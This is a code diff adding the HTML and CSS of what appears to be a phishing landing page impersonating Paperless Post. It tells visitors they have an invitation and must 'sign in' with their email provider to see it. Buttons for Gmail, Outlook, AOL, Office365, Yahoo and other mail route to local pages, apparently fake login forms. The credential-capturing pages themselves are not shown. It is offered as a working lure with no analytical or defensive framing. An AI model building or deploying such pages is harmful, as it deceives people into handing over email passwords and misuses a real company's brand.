+    .btn:nth-child(6) { animation-delay: 0.60s; }
+
+    .divider {
+      height: 1px;
+      background: rgba(255,255,255,0.09);
+      border-radius: 1px;
+      margin-bottom: 20px;
+      animation: fadeUp 0.4s 0.64s ease both;
+    }
+
+    .footer-text {
+      font-size: 0.78rem;
+      color: var(--text-footer);
+      text-align: center;
+      line-height: 1.7;
+      animation: fadeUp 0.4s 0.68s ease both;
+    }
+
+    .footer-text .copy {
+      display: block;
+      margin-top: 9px;
+      font-size: 0.72rem;
+      opacity: 0.78;
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(14px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="card">
+
+  <div class="logo-wrap">
+    <div class="logo-box">
+      <img src="https://static0.pocketlintimages.com/wordpress/wp-content/uploads/2023/12/paperless-post.jpg" alt="Paperless Post" />
+    </div>
+  </div>
+
+  <h1 class="headline">Manage your E-invite &amp; Greeting Cards</h1>
+
+  <p class="subline">
+    You've received a special invitation.<br>
+    To see the invitation, choose your email provider below and sign in. You were invited to view the invitation via Paperless Post.
+  </p>
+
+  <div class="btn-list" id="btnList">
+
+    <a href="./gmail" class="btn btn-gmail">
+      <span class="btn-icon">
+        <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M3 9h30v18a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" stroke="white" stroke-width="2" fill="rgba(255,255,255,0.12)"/>
+          <path d="M3 9l15 11L33 9" stroke="white" stroke-width="2" stroke-linejoin="round"/>
+        </svg>
+      </span>
+      <span class="btn-label">Sign in with Gmail</span>
+    </a>
+
+    <a href="./outlook" class="btn btn-outlook">
+      <span class="btn-icon">
+        <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="2" y="6" width="19" height="24" rx="2" fill="rgba(255,255,255,0.85)"/>
+          <ellipse cx="11.5" cy="18" rx="5.5" ry="6.5" fill="#0072c6"/>
+          <rect x="22" y="10" width="12" height="16" rx="2" fill="rgba(255,255,255,0.55)"/>
+          <line x1="22" y1="16" x2="34" y2="11" stroke="rgba(255,255,255,0.7)" stroke-width="1.3"/>
+          <line x1="22" y1="18" x2="34" y2="18" stroke="rgba(255,255,255,0.7)" stroke-width="1.3"/>
+          <line x1="22" y1="20" x2="34" y2="25" stroke="rgba(255,255,255,0.7)" stroke-width="1.3"/>
+        </svg>
+      </span>
+      <span class="btn-label">Sign in with Outlook</span>
+    </a>
+
+    <a href="./aol" class="btn btn-aol">
+      <span class="btn-icon">
+        <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <text x="18" y="25" text-anchor="middle" font-family="Arial Black, sans-serif" font-size="14" font-weight="900" fill="white">Aol.</text>
+        </svg>
+      </span>
+      <span class="btn-label">Sign in with Aol</span>
+    </a>
+
+    <a href="./outlook" class="btn btn-office">
+      <span class="btn-icon">
+        <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="4"  y="4"  width="12" height="12" rx="2" fill="rgba(255,255,255,0.88)"/>
+          <rect x="20" y="4"  width="12" height="12" rx="2" fill="rgba(255,255,255,0.6)"/>
+          <rect x="4"  y="20" width="12" height="12" rx="2" fill="rgba(255,255,255,0.6)"/>
+          <rect x="20" y="20" width="12" height="12" rx="2" fill="rgba(255,255,255,0.88)"/>
+        </svg>
+      </span>
+      <span class="btn-label">Sign in with Office365</span>
+    </a>
+
+    <a href="./yahoo" class="btn btn-yahoo">
+      <span class="btn-icon">
+        <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <text x="18" y="27" text-anchor="middle" font-family="Georgia, serif" font-size="22" font-weight="700" fill="white">Y!</text>
+        </svg>
+      </span>
+      <span class="btn-label">Sign in with Yahoo!</span>
+    </a>
+
+    <a href="#othermail-link-here" class="btn btn-other">
+      <span class="btn-icon">
+        <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="18" cy="18" r="7" stroke="white" stroke-width="2"/>
+          <circle cx="18" cy="18" r="2.5" fill="white"/>
+          <path d="M25 18c0 6 5 7.5 5 3.5C30 13.5 24 7 16 9S6 18 8 24c2 6 10 8 16 5" stroke="white" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+      </span>
+      <span class="btn-label">Sign in with Other Mail</span>
+    </a>
+
+  </div>
+
+  <div class="divider"></div>
+
+  <p class="footer-text">
+    With Paperless Post, you can effortlessly plan events using easy-to-use tools for online invitations and greeting cards.
+    <span class="copy">© 2026 Sincere Corporation. Paperless Post® is a registered trademark. All rights reserved.</span>
+  </p>
+
+</div>
+
 </body>
 </html>
